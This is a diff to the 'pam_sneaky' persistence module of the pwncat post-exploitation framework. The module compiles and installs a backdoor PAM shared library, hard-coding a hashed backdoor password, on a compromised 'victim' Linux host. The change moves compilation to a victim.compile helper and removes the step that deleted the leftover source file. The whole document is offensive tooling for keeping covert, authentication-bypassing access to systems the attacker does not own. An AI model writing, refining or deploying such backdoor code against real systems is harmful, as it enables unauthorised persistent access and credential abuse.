@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import base64
 import hashlib
+import io
 import os
 import textwrap
 from typing import Optional
@@ -8,7 +9,7 @@ from typing import Optional
 import pwncat
 from pwncat import util
 from pwncat.persist import PersistenceMethod, PersistenceError
-from pwncat.util import Access
+from pwncat.util import Access, CompilationError
 
 
 class Method(PersistenceMethod):
@@ -79,6 +80,7 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
         sneaky_source = base64.b64decode(sneaky_source).decode("utf-8")
 
         # We use the backdoor password. Build the string of encoded bytes
+        # These are placed in the source like: char password_hash[] = {0x01, 0x02, 0x03, ...};
         password = hashlib.sha1(
             pwncat.victim.config["backdoor_pass"].encode("utf-8")
         ).digest()
@@ -93,26 +95,18 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
         # Write the source
         try:
 
-            util.progress("pam_sneaky: creating source")
+            util.progress("pam_sneaky: compiling shared library")
 
-            # Create the tempfile
-            with pwncat.victim.tempfile(
-                "w", length=len(sneaky_source), suffix=".c"
-            ) as filp:
-                filp.write(sneaky_source)
-                source_path = filp.name
-
-            # Replace ".c" with ".o"
-            lib_path = source_path.rstrip(".c") + ".so"
-
-            util.progress("pam_sneaky: building shared library")
-
-            pwncat.victim.env(
-                ["gcc", "-o", lib_path, "-shared", "-fPIE", source_path, "-lcrypto"]
-            )
-
-            if Access.EXISTS not in pwncat.victim.access(lib_path):
-                raise PersistenceError("pam_sneaky: module compilation failed")
+            try:
+                # Compile our source for the remote host
+                lib_path = pwncat.victim.compile(
+                    [io.StringIO(sneaky_source)],
+                    suffix=".so",
+                    cflags=["-shared", "-fPIE"],
+                    ldflags=["-lcrypto"],
+                )
+            except (FileNotFoundError, CompilationError) as exc:
+                raise PersistenceError(f"pam: compilation failed: {exc}")
 
             util.progress("pam_sneaky: locating pam module location")
 
@@ -191,13 +185,6 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
         except FileNotFoundError as exc:
             # A needed binary wasn't found. Clean up whatever we created.
             raise PersistenceError(str(exc))
-        finally:
-            try:
-                # Whatever happens, remove our source file.
-                pwncat.victim.env(["rm", "-f", source_path])
-            except FileNotFoundError:
-                # If we can't remove it, register it as a tamper
-                pwncat.victim.tamper.created_file(source_path)
 
     def remove(self, user: Optional[str] = None):
         """ Remove this method """
